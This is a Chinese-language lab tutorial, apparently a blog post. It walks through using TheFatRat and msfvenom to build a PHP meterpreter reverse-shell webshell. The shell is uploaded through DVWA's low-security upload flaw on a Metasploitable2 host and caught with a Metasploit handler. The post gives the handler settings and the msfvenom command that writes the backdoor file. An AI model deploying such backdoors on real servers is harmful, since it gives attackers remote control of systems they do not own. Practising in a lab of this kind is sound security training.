1.模拟实验环境：


1.（模拟攻击者）

系统：kali linux 2.0

使用到的程序工具：Thefatrat、metaspoit

 反弹shell ip地址/端口：192.168.1.104：4444

使用msf  payload类型: php/meterpreter/reverse_tcp

使用fatrat生成的webshell后门木马：demon.php


2.(模拟受害者)     

 系统:Linux——–Metasploitable2

使用测试网页模版：Dvwa

利用漏洞：update（low）上传漏洞

受害者ip：192.168.1.103

 

2.操作步骤指南


启动 fatrat ：

root@kali:~/TheFatRat# ./fatrat


启动的时候比较慢，因为在检测依赖环境等步骤


 

以上回车再回车即可。可以看到以下界面：选择序号1，使用msfvenom的payload。


 

在这里我们可以看到他自动的生成木马后门的类型，有exe.php.asp.jsp.war.apk 等类型，我们这里选择序号 5 即可，选择 php 类型。


 

设置顺序：设置工具者ip，工具者反弹的端口(任意)、设置生成的木马文件名（任意）



在这里我们可以看到生成的文件（在安装目录的output文件夹）


 

启动 metaspoit 设置反弹 shell 的 ip 和端口：

msf exploit(handler) > set payload php/meterpreter/reverse_tcp      （设置payload 连接攻击者电脑类型）
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.104                            （设置）攻击者ip （和之前fatrat一样）
LHOST => 192.168.1.104                   
msf exploit(handler) > set LPORT 4444                         （设置）攻击者需反弹的i端口（和之前fatrat一样）LPORT => 4444
msf exploit(handler) > exploit                        （执行监听）



上传 webshell/执行webshell



同样，可以手动使用 msf 的 msfvenom 生成 php 后门（由于msf版本更新，移除metasploit-framework版本中的msfencoder和msfpayload，并使用msfvenom取代）


msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f raw >shell.php


msfvenom 具体使可参考： http://www.freebuf.com/sectool/72135.html 。
